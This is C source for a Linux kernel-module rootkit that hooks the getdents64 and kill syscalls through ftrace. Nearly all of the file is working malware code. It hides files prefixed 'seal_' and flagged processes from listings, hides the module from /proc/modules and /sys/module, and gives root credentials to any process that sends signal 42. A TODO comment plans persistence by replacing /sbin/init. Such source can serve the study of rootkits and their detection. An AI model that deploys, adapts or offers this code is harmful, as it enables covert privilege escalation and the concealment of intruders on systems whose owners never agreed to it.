#include "ftrace_helper.h"

#define PREFIX "seal_"
#define INVIS 0x10000000

/// Enable debug prints
const int DEBUG = 1;

/// Used to save list entries so we can restore the kernel module
/// again after hiding it
static struct list_head *prev_module = NULL;

/// Struct required to hook getdents64
struct linux_dirent64 {
    u64            d_ino;
    s64            d_off;
    unsigned short d_reclen;
    unsigned char  d_type;
    char           d_name[];
};

/// Save original syscall functions so we can restore them once we
/// are finished hooking
static asmlinkage long (*orig_getdents64)(const struct pt_regs *);
static asmlinkage long (*orig_kill)(const struct pt_regs *);

/// Wrapper for the prints
void debug_print(char *msg) {
    if (DEBUG) { printk(KERN_INFO "%s", msg); }
}

/* TODO
   3. persistence
    replacee /sbin/init
    https://yassine.tioual.com/posts/backdoor-initramfs-and-make-your-rootkit-persistent/
*/

/// Find a process in the process list
struct task_struct *find_task(pid_t pid) {
    struct task_struct *p = current;
    for_each_process(p) {
        if (p->pid == pid) {
            return p;
        }
    }
    return NULL;
}

/// Check if a /proc file is meant to be invisible
int check_invis(pid_t pid) {
	struct task_struct *task;
	task = find_task(pid);
	if (!task)
		return 0;
	if (task->flags & INVIS)
		return 1;
	return 0;
}

/// Hook getdets64, this lets us edit directory and process listings
asmlinkage int hook_getdents64(const struct pt_regs *regs) {
    int tmp;
    unsigned long offset = 0;
    struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;
    struct linux_dirent64 *current_dir, *dirent_ker, *previous_dir = NULL;

    int ret = orig_getdents64(regs);
    dirent_ker = kzalloc(ret, GFP_KERNEL);
    tmp = copy_from_user(dirent_ker, dirent, ret);

    while (offset < ret) {
        current_dir = (void *)dirent_ker + offset;

        if ((memcmp(PREFIX, current_dir->d_name, strlen(PREFIX)) == 0) ||
        check_invis(simple_strtoul(current_dir->d_name, NULL, 10))) {
            if (current_dir == dirent_ker) {
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                continue;
            }

            previous_dir->d_reclen += current_dir->d_reclen;
        } else {
            previous_dir = current_dir;
        }
        offset += current_dir->d_reclen;
    }

    tmp = copy_to_user(dirent, dirent_ker, ret);

    kfree(dirent_ker);
    return ret;
}

/// Hook for kill syscall that allows us to intercept all signals
asmlinkage int hook_kill(const struct pt_regs *regs) {
    int sig   = regs->si;
    pid_t pid = regs->di;
    int tmp;
    struct cred *root;
    struct task_struct *task;

    switch(sig) {
        case 40: /* Hide the rootkit if it is not already hidden */
            // Remove rootkit from /proc/modules
            if (prev_module == NULL) {
                prev_module = THIS_MODULE->list.prev;
                list_del(&THIS_MODULE->list);
            }

            // Remove rootkit from /sys/module
            kobject_del(&THIS_MODULE->mkobj.kobj);
            list_del(&THIS_MODULE->mkobj.kobj.entry);

            debug_print("Rootkit is hidden");
            return 0;
        case 41: /* Reveal the rootkit again by adding it back to all lists */
            list_add(&THIS_MODULE->list, prev_module);
            tmp = kobject_add(&THIS_MODULE->mkobj.kobj, THIS_MODULE->mkobj.kobj.parent,
                    THIS_MODULE->name);
            prev_module = NULL;

            debug_print("Rootkit is no longer hidden");
            return 0;
        case 42: /* Give root to calling process */
            root = prepare_creds();

            root->uid.val = root->gid.val = 0;
            root->euid.val = root->egid.val = 0;
            root->suid.val = root->sgid.val = 0;
            root->fsuid.val = root->fsgid.val = 0;

            commit_creds(root);

            debug_print("Root access successfuly granted");
            return 0;
        case 43: /* Hide calling process by setting the INVIS flag which signals our hooked
                    getdents64 syscall to ignore this entry */
            if ((task = find_task(pid)) == NULL) {
                return -1;
            }
            task->flags ^= INVIS;
            return 0;
    }
    return orig_kill(regs);
}

/// Struct that contains all hooks this rootkit offers
static struct ftrace_hook hooks[] = {
    HOOK("__x64_sys_getdents64", hook_getdents64, &orig_getdents64),
    HOOK("__x64_sys_kill", hook_kill, &orig_kill),
};

/// Initialize and insert hooks
static int __init init_func(void) {
    if(fh_install_hooks(hooks, ARRAY_SIZE(hooks))) {
        return -1;
    }

    debug_print("rootkit: loaded\n");
    return 0;
}

/// Clean up all hooks and remove module from kernel
static void __exit exit_func(void) {
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
    debug_print("rootkit: unloaded\n");
}

MODULE_AUTHOR("seal9055 <seal9055@gmail.com>");
MODULE_DESCRIPTION("Simple rootkit");
MODULE_LICENSE("GPL");
MODULE_VERSION("1.0");
module_init(init_func);
module_exit(exit_func);
